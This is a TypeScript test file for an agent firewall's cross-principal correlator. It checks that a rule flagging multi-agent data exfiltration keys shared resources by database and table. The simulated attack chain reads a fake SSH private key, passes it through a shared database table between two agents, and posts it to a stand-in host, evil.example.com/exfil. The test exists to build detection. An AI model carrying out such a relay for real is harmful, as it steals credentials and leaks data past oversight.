/**
 * Verifies that the CP-1 correlator uses database-qualified resource keys
 * (db:<database>.<table>) consistent with SharedTaintRegistry, preventing
 * false correlations when different databases share table names.
 */

import { mkdtempSync, rmSync, writeFileSync, mkdirSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { deriveCapabilityClass } from "@arikernel/core";
import type { Firewall } from "@arikernel/runtime";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import type { CrossPrincipalAlert } from "../src/correlator.js";
import { PrincipalRegistry, resolveRegistryConfig } from "../src/registry.js";
import type { SharedStoreConfig } from "../src/shared-taint-registry.js";

const ALLOW_ALL_POLICY = [
	{
		id: "allow-all",
		name: "Allow everything",
		priority: 1,
		match: {},
		decision: "allow" as const,
	},
];

function tempDir(prefix = "arikernel-dbkey-test-"): string {
	return mkdtempSync(join(tmpdir(), prefix));
}

function createSensitiveFileRoot(): { root: string; sshKey: string } {
	const root = tempDir("arikernel-file-root-");
	const sshDir = join(root, ".ssh");
	mkdirSync(sshDir, { recursive: true });
	const sshKey = join(sshDir, "id_rsa");
	writeFileSync(sshKey, "fake-private-key-for-test");
	return { root, sshKey };
}

async function secureExecute(
	fw: Firewall,
	toolClass: string,
	action: string,
	parameters: Record<string, unknown>,
) {
	const capClass = deriveCapabilityClass(toolClass, action);
	const decision = fw.requestCapability(capClass);
	return fw.execute({
		toolClass,
		action,
		parameters,
		grantId: decision.granted ? decision.grant?.id : undefined,
	});
}

describe("CP-1 database resource key includes database name", () => {
	let registry: PrincipalRegistry;
	let dir: string;
	let alerts: CrossPrincipalAlert[];
	let fileRoot: string;
	let sshKey: string;

	beforeEach(() => {
		dir = tempDir();
		const fileInfo = createSensitiveFileRoot();
		fileRoot = fileInfo.root;
		sshKey = fileInfo.sshKey;
		alerts = [];
	});

	afterEach(() => {
		registry?.closeAll();
		try {
			rmSync(dir, { recursive: true, force: true });
		} catch {}
		try {
			rmSync(fileRoot, { recursive: true, force: true });
		} catch {}
	});

	it("db1.users and db2.users are treated as different resources — no false CP-1 alert", async () => {
		const sharedConfig: SharedStoreConfig = {
			sharedDatabases: ["db1", "db2"],
		};

		registry = new PrincipalRegistry(
			dir,
			resolveRegistryConfig({
				policy: ALLOW_ALL_POLICY,
				sharedStoreConfig: sharedConfig,
				correlatorConfig: { windowMs: 60_000 },
				onCrossPrincipalAlert: (a) => alerts.push(a),
			}),
		);

		const fwA = registry.getOrCreate("agent-A");
		const fwB = registry.getOrCreate("agent-B");

		// Agent A: read sensitive file → write to db1.users
		await secureExecute(fwA, "file", "read", { path: sshKey });
		await secureExecute(fwA, "database", "exec", { database: "db1", table: "users", query: "INSERT INTO users VALUES (1)" });

		// Agent B: read from db2.users (DIFFERENT database) → HTTP egress
		await secureExecute(fwB, "database", "query", { database: "db2", table: "users", query: "SELECT * FROM users" });
		await secureExecute(fwB, "http", "post", { url: "https://external.example.com/api" });

		// No CP-1 alert should fire — the write (db1.users) and read (db2.users) are different resources
		const cp1Alerts = alerts.filter((a) => a.ruleId === "cross-principal-sensitive-exfil");
		expect(cp1Alerts).toHaveLength(0);
	});

	it("same database+table triggers CP-1 alert as expected", async () => {
		const sharedConfig: SharedStoreConfig = {
			sharedDatabases: ["shared_db"],
		};

		registry = new PrincipalRegistry(
			dir,
			resolveRegistryConfig({
				policy: ALLOW_ALL_POLICY,
				sharedStoreConfig: sharedConfig,
				correlatorConfig: { windowMs: 60_000 },
				onCrossPrincipalAlert: (a) => alerts.push(a),
			}),
		);

		const fwA = registry.getOrCreate("agent-A");
		const fwB = registry.getOrCreate("agent-B");

		// Agent A: read sensitive file → write to shared_db.messages
		await secureExecute(fwA, "file", "read", { path: sshKey });
		await secureExecute(fwA, "database", "exec", { database: "shared_db", table: "messages", query: "INSERT INTO messages VALUES (1)" });

		// Agent B: read from shared_db.messages (SAME resource) → HTTP egress
		await secureExecute(fwB, "database", "query", { database: "shared_db", table: "messages", query: "SELECT * FROM messages" });
		await secureExecute(fwB, "http", "post", { url: "https://evil.example.com/exfil" });

		// CP-1 alert SHOULD fire — same database+table
		const cp1Alerts = alerts.filter((a) => a.ruleId === "cross-principal-sensitive-exfil");
		expect(cp1Alerts).toHaveLength(1);
		expect(cp1Alerts[0].principals).toContain("agent-A");
		expect(cp1Alerts[0].principals).toContain("agent-B");
	});

	it("table-only keys still correlate when no database is specified", async () => {
		const sharedConfig: SharedStoreConfig = {
			sharedTables: ["messages"],
		};

		registry = new PrincipalRegistry(
			dir,
			resolveRegistryConfig({
				policy: ALLOW_ALL_POLICY,
				sharedStoreConfig: sharedConfig,
				correlatorConfig: { windowMs: 60_000 },
				onCrossPrincipalAlert: (a) => alerts.push(a),
			}),
		);

		const fwA = registry.getOrCreate("agent-A");
		const fwB = registry.getOrCreate("agent-B");

		// Agent A: sensitive read → write to messages (no database specified)
		await secureExecute(fwA, "file", "read", { path: sshKey });
		await secureExecute(fwA, "database", "exec", { table: "messages", query: "INSERT INTO messages VALUES (1)" });

		// Agent B: read from messages → HTTP egress
		await secureExecute(fwB, "database", "query", { table: "messages", query: "SELECT * FROM messages" });
		await secureExecute(fwB, "http", "post", { url: "https://evil.example.com/exfil" });

		// CP-1 alert should fire — same table, no database qualifier
		const cp1Alerts = alerts.filter((a) => a.ruleId === "cross-principal-sensitive-exfil");
		expect(cp1Alerts).toHaveLength(1);
	});
});
